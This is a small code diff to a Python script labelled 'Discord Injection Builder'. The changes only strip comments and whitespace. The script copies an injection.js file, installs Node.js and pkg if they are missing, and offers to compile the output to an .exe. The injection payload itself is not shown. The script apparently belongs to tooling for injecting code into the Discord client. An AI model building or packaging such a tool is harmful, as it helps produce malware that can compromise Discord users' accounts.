@@ -9,9 +9,8 @@ init()
 
 INJECTION_SOURCE = 'injection.js'
 INJECTION_OUTPUT = 'build_injection.js'
-NODEJS_URL = 'https://nodejs.org/dist/v20.11.1/node-v20.11.1-x64.msi'  # LTS-Version, ggf. anpassen
+NODEJS_URL = 'https://nodejs.org/dist/v20.11.1/node-v20.11.1-x64.msi'
 NODEJS_INSTALLER = 'node_installer.msi'
-
 
 def print_banner():
     print(f"{Fore.MAGENTA}=== Discord Injection Builder ==={Style.RESET_ALL}")
@@ -32,15 +31,15 @@ def download_nodejs():
     sys.exit(1)
 
 def ensure_node_and_pkg():
-    # Check Node.js
+
     if not is_command_available('node'):
         download_nodejs()
         return False
-    # Check npm
+
     if not is_command_available('npm'):
         print(f"{Fore.RED}npm is not installed! Please reinstall Node.js and ensure npm is included.{Style.RESET_ALL}")
         return False
-    # Check pkg
+
     if not is_command_available('pkg'):
         print(f"{Fore.YELLOW}pkg is not installed. Installing pkg globally...{Style.RESET_ALL}")
         try:
@@ -75,7 +74,6 @@ def main():
         f.write(content)
     print(f"{Fore.GREEN}Injection file built successfully: {INJECTION_OUTPUT}{Style.RESET_ALL}")
 
-    # Optional: Compile to .exe
     choice = input(f"{Fore.YELLOW}Do you want to compile to .exe using pkg? (y/n): {Style.RESET_ALL}").strip().lower()
     if choice == 'y':
         if not ensure_node_and_pkg():
@@ -91,4 +89,4 @@ def main():
         print(f"{Fore.YELLOW}You can manually compile with: pkg {INJECTION_OUTPUT} --output injection.exe{Style.RESET_ALL}")
 
 if __name__ == "__main__":
-    main() 
+    main()
